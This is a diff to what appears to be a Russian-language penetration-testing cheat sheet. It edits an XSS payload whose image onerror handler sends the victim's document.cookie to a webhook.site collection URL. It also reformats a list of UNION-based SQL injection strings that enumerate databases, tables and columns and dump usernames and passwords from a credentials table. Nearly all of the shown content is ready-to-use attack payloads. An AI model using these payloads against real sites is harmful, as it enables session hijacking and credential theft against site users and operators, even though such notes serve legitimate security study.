@@ -93,7 +93,8 @@ Cero подключается к удалённым хостам и считыв
 ### XSS Payload
 
 ```html
-<img src=x onerror="this.src='https://webhook.site/b8ce3f5c-707d-406f-a8df-0dd7928bca42?c='+document.cookie;">
+<img src="x" onerror="this.src='https://webhook.site/ed4c7969-5419-4849-bf6d-003858a4c8a2?c='+encodeURIComponent(document.cookie); this.removeAttribute('onerror');">
+
 ```
 
 #### exploit.svg
@@ -117,11 +118,11 @@ Cero подключается к удалённым хостам и считыв
 ## SQLi (SQL Injection)
 - [Stacked Queries](https://www.sqlinjection.net/stacked-queries/)  
 - [Pentestmonkey SQLi Cheat Sheet](https://pentestmonkey.net/category/cheat-sheet/sql-injection)
-cn' UNION select 1,database(),2,3-- -	Current database name
-cn' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -	List all databases
-cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- -	List all tables in a specific database
-cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- -	List all columns in a specific table
-cn' UNION select 1, username, password, 4 from dev.credentials-- -	Dump data from a table in another database
+- cn' UNION select 1,database(),2,3-- -	Current database name
+- cn' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -	List all databases
+- cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- -	List all tables in a specific database
+- cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- -	List all columns in a specific table
+- cn' UNION select 1, username, password, 4 from dev.credentials-- -	Dump data from a table in another database
 ---
 ## jQuery
 - `jquery.fn.jquery` в `jQuery` возвращает строку, содержащую текущую версию библиотеки `jQuery`. Например, если вы используете `jQuery 3.7.0`, то `jquery.fn.jquery` вернет `3.7.0`
